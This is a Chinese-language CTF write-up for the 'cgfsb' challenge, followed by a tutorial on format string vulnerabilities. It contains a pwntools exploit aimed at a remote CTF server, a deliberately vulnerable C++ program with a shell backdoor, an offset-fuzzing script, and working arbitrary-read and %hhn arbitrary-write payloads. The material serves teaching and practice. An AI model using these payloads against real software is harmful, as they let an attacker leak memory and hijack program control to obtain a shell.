## cgfsb

2019-5-20

### 解题

这是一道格式化字符串的题目

题目要求把一个全局变量的值赋值为8

下面是exp

```python
#!/usr/bin/python2
#coding: utf8
from pwn import *
import time

pwnme = 0x804A068 #全局变量的内存地址

value = 8         #要赋成的值

context.log_level = "debug" #让pwntools输出调试信息


def exec_fmt(payload):  #需要定义一个函数，这个函数能够返回printf(输入的格式化字符串)所打印的字符串
    p = remote("111.198.29.45", "44114")
    p.sendline("leaf")
    time.sleep(1)
    p.recv()
    p.sendline(payload)
    time.sleep(1)
    response = p.recv()

    return response

autofmt = FmtStr(exec_fmt)  #自动计算参数的位置，此处计算出来为10
#生成格式化字符串payload，位置为10，第二个参数为覆盖值的设置，格式为{要覆盖数值的地址:覆盖成的数值}
payload = fmtstr_payload(10, {pwnme: 8}) 

p = remote("111.198.29.45", "44114")
p.sendline("leaf")
time.sleep(1)
p.recv()
p.sendline(payload)
time.sleep(1)
print p.recv()

```

### 关于格式化字符串漏洞

如果没有用过格式化字符串建议先看一下ctf-wiki上的[格式化字符串介绍](<https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_4>)

##### 示例程序

`g++ -o format_test -no-pie program_v1.cpp`

```c++
#include <cstdio>   //printf()
#include <cstdlib>  //system()
#include <unistd.h> //read()

const char* secret = "{this-will-be-patched-in-run-time}";
int backdoor_trigger = 0;
int main()
{
    char buf[100] = {}; //这里把读到的数据放到了栈上，方便定位
    read(0, buf, 99);
    printf(buf);

    printf("Your chioce is %d\n", backdoor_trigger);
    if(backdoor_trigger == 22332233)
    {   
        system("/bin/sh");
    }   
    else
    {   
        system("echo 'no way'");
    }   
    return 0;
}
```

##### 任意地址读取

在格式化字符串中可以使用 `n$`指定使用哪个参数，其中`n`为整数

比如`printf("%s", buf1, buf2)`中buf1为第一个参数，buf2为第二个参数

在这个例子中默认打印指针buf1指向的字符串，如果想打印指针buf2指向的字符串，则只需改成`printf("%2$s", buf1, buf2)`



对于上面的示例程序来讲，想要读取secret的内容，首先需要通过一定途径获取到指针的数值。

然后将该指针的数值作为参数，传递给`"%s"`，即可打印出secret

1. 获取secret指针的数值

因为是const char，所以在.rodata段下

```shell
$ readelf -p .rodata format_test

String dump of section '.rodata':
  [     8]  {this-will-be-patched-in-run-time}
  [    2b]  /bin/sh
$ readelf -S format_test | grep .rodata
  [16] .rodata           PROGBITS         0000000000400730  00000730
```

得到指针的数值为0x400730+8 = 0x400738

2. 定位参数位置，这里手写一个自动测试的脚本

```python
#!/usr/bin/python2
#coding: utf8
"""
from pwn import *
def auto(input):
    p = process("./format_test")
    p.sendline(input)
    return p.recv()
"""
#在没有pwntools的时候
import subprocess
from subprocess import PIPE

def auto(input):
    p = subprocess.Popen("./format_test", stdin=PIPE, stdout=PIPE)
    return p.communicate(input)[0]

for i in range(0, 20):
    payload  = 'AAAASTART%%%d$xEND' % i #一次读四个字节
    response = auto(payload)

    print "send:", payload
    print "recv:", auto(payload)
    if response.find("AAAASTART41414141END") != -1:
        print "found at offset: ", i
        break
```

```shell
$ python fuzz.py
send: AAAASTART%0$xEND
recv: AAAASTART%0$xEND
send: AAAASTART%1$xEND
recv: AAAASTARTf831c8b0END
send: AAAASTART%2$xEND
recv: AAAASTART63END
send: AAAASTART%3$xEND
recv: AAAASTART37bEND
send: AAAASTART%4$xEND
recv: AAAASTART400720END
send: AAAASTART%5$xEND
recv: AAAASTARTe3210ac0END
send: AAAASTART%6$xEND
recv: AAAASTART41414141END
found at offset:  6
```

传入的字符串被作为第六个参数

3. 传入参数，读取数据

```python
#!/usr/bin/python2
#coding: utf8
import struct
import subprocess
from subprocess import PIPE as PIPE

leak_addr = 0x400738

#因为8字节指针中有\x00,导致printf打印时会被截断，所以放到后面，作为第七个参数
payload = r"%7$sAAAA" #因为是六十四位系统，一个指针的长度为8字节，所以要填充四个A，进行对齐
payload += struct.pack("<Q", leak_addr) #64bit, little-endian


process = subprocess.Popen("./format_test", stdin=PIPE, stdout=PIPE)
print process.communicate(payload)[0]

```

```shell
$ python exp.py
{this-will-be-patched-in-run-time}AAAA8@
```

`8[不可打印字符]@`为leak_addr对应的字符

```
>>> import struct
>>> i = struct.pack("<Q",0x400738)
>>> i
'8\x07@\x00\x00\x00\x00\x00'
```

任意地址读取可以用来dump远程文件



##### 任意地址写入

格式化字符串中有一个类型`%n`，用于将已写出的字符的数量写入到对应的变量里

比如我们想对某个参数写入数值X，则只需打印出X个字符，然后再放一个`%变量索引$n`，即可对参数写入数值。

不过如果我们赋的数值很大，比如修改栈上的返回地址，打印一个非常非常长的字符串到屏幕上不是个好主意，可以通过指定输出长度，逐个字节的写入。每写一个字节打印的字符不超过255个。



关于控制输出长度，摘自[wiki](https://en.wikipedia.org/wiki/Printf_format_string)

| Character | Description                                                  |
| --------- | ------------------------------------------------------------ |
| `hh`      | For integer types, causes `printf` to expect an `int`-sized integer argument which was promoted from a `char`. |
| `h`       | For integer types, causes `printf` to expect an `int`-sized integer argument which was promoted from a `short`. |
| `l`       | For integer types, causes `printf` to expect a `long`-sized integer argument.For floating point types, this has no effect.[[3\]](https://en.wikipedia.org/wiki/Printf_format_string#cite_note-c99io-3) |
| `ll`      | For integer types, causes `printf` to expect a `long long`-sized integer argument. |
| `L`       | For floating point types, causes `printf` to expect a `long double` argument. |
| `z`       | For integer types, causes `printf` to expect a `size_t`-sized integer argument. |
| `j`       | For integer types, causes `printf` to expect a `intmax_t`-sized integer argument. |
| `t`       | For integer types, causes `printf` to expect a `ptrdiff_t`-sized integer argument. |

对于上面的例题，想触发后门需要将backdoor_trigger的值改为22332233

```python
#!/usr/bin/python2
#coding: utf8
import struct

write_addr = 0x60105c

#要写成的值为0x154C349
payload = r"%73c"    #已0x49个字符
payload += r"%12$hhn"
payload += r"%122c"  #已输出73+122=0xc3个字符
payload += r"%13$hhn"
payload += r"%145c"  #已输出73 + 122 + 145 = 340个字符，因为只写入一个字节，所以为340 & 0xFF = 0x54
payload += r"%14$hhn"
payload += r"%173c"  #已输出73 + 122 + 145 + 173 = 513个字符，513 & 0xFF = 0x1
payload += r"%15$hhn"
payload += 'A'       #用于8字节对齐的填充

payload += struct.pack("<Q", write_addr)
payload += struct.pack("<Q", write_addr+1)
payload += struct.pack("<Q", write_addr+2)
payload += struct.pack("<Q", write_addr+3)

#由于数据只有22和33，所以也可以进行数据复用
from pwn import *
p = process("./format_test")
p.sendline(payload)
p.interactive()

```



### 参考阅读

关于.bss .data .rodata <https://blog.csdn.net/qq_26626709/article/details/51887085>

格式化字符串漏洞学习<https://veritas501.space/2017/04/28/格式化字符串漏洞学习/>

ctf-wiki <https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/>